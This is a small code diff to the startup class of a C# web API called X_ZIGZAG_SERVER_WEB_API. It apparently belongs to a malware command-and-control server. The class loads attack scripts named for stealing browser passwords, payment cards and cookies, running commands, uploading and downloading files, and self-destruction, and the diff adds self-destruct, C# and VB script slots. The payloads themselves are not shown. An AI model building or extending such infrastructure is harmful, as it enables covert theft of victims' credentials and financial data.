@@ -11,6 +11,7 @@ namespace X_ZIGZAG_SERVER_WEB_API.Data
     {
         public static void Initialize(MyDbContext context,IMemoryCache cache , IHostEnvironment hostEnvironment)
         {
+            cache.Set(-1, ReadTextFile(Path.Combine(hostEnvironment.ContentRootPath, "Scripts", "SELF_DESTRUCT.txt")));
             cache.Set(0, ReadTextFile(Path.Combine(hostEnvironment.ContentRootPath, "Scripts", "UPLOAD.txt")));
             cache.Set(1, ReadTextFile(Path.Combine(hostEnvironment.ContentRootPath, "Scripts", "DOWNLOAD.txt")));
             cache.Set(2, ReadTextFile(Path.Combine(hostEnvironment.ContentRootPath, "Scripts", "CMD.txt")));
@@ -20,6 +21,8 @@ namespace X_ZIGZAG_SERVER_WEB_API.Data
             cache.Set(6, ReadTextFile(Path.Combine(hostEnvironment.ContentRootPath, "Scripts", "BROWSER_PASSWORDS.txt")));
             cache.Set(7, ReadTextFile(Path.Combine(hostEnvironment.ContentRootPath, "Scripts", "BROWSER_CARDS.txt")));
             cache.Set(8, ReadTextFile(Path.Combine(hostEnvironment.ContentRootPath, "Scripts", "BROWSER_COOKIES.txt")));
+            cache.Set(9, ReadTextFile(Path.Combine(hostEnvironment.ContentRootPath, "Scripts", "CSHARP.txt")));
+            cache.Set(10, ReadTextFile(Path.Combine(hostEnvironment.ContentRootPath, "Scripts", "VB.txt")));
 
             context.Database.EnsureCreated();
             if (context.Admins.Any())
